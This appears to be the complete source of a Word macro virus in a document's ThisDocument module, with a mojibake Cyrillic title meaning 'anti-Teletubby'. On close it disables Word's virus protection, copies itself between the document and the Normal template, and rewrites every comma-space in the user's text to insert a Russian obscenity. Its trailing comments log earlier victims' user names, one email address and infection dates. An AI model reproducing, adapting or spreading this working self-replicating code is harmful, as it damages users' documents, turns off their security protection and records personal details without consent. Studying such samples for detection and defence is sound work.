   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True








   ' ÀÍÒÈ-ÒÅËÅÏÓÇÈÊ
   '
   '





   Private Sub Document_Close()
      On Error Resume Next
      Dim vir, dot As Object
      Dim s As String
      Dim viris, dotis As Boolean
      Set vir = ActiveDocument.VBProject.VBComponents.Item(1)
      Set dot = NormalTemplate.VBProject.VBComponents.Item(1)
      viris = False
      dotis = False
      If vir.CodeModule.CountOfLines <> 0 Then viris = True
      If dot.CodeModule.CountOfLines <> 0 Then dotis = True
      If (viris = True Xor dotis = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
           If viris = True Then
               Options.VirusProtection = False
               s = vir.CodeModule.Lines(1, vir.CodeModule.CountOfLines)
               dot.CodeModule.InsertLines 1, s
               If NormalTemplate.Saved = True Then NormalTemplate.Save
           End If
           If dotis = True Then
               s = dot.CodeModule.Lines(1, dot.CodeModule.CountOfLines)
               s = s & Chr(13) & Chr(13) & "' " & Application.UserName & "@" & Application.UserAddress & Format(Time, " hh:mm:ss - ") & Format(Date, "dddd, d mmm yyyy")
               vir.CodeModule.InsertLines 1, s
               If ActiveDocument.Saved = True Then ActiveDocument.Save
           End If
      End If

      Randomize (666)
      'If Round(Rnd * 50) = 13 Then MsgBox "ß ÍÅÍÀÂÈÆÓ ÒÅËÅÏÓÇÈÊÎÂ!!!", vbExclamation
      'If Round(Rnd * 13) = 3 Then
       Selection.Find.ClearFormatting
       Selection.Find.Replacement.ClearFormatting
       With Selection.Find
           .Text = ", "
           .Replacement.Text = ", áëÿ, "
           .Forward = True
           .Wrap = wdFindContinue
           .Format = False
           .MatchCase = False
           .MatchWholeWord = False
           .MatchWildcards = False
           .MatchSoundsLike = False
           .MatchAllWordForms = False
       End With
       Selection.Find.Execute Replace:=wdReplaceAll
      'End If
   End Sub



   ' Dmitrij@ 14:20:46 - ñðåäà, 20 èþí 2001

   ' ‘¥à¦@ 17:29:01 - ïîíåäåëüíèê, 2 èþë 2001

   ' fayer@aku@tanak-cakap.com 18:13:43 - ïÿòíèöà, 25 ìàé 2001
